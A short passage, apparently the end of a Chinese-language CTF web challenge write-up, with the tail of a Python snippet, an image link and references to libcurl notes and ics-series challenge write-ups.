        )

print(data)
```

![](/assets/images/move/20191006000147.png)


**\- 参考链接 -**


1. [PHP的libcurl中存在的一些问题](http://wonderkun.cc/index.html/?p=670)

2. [Web-(ics-05/ics-07)-WriteUp](http://www.guildhab.top/?p=481)

3. [Web-ics-02-WriteUp](http://www.guildhab.top/?p=708)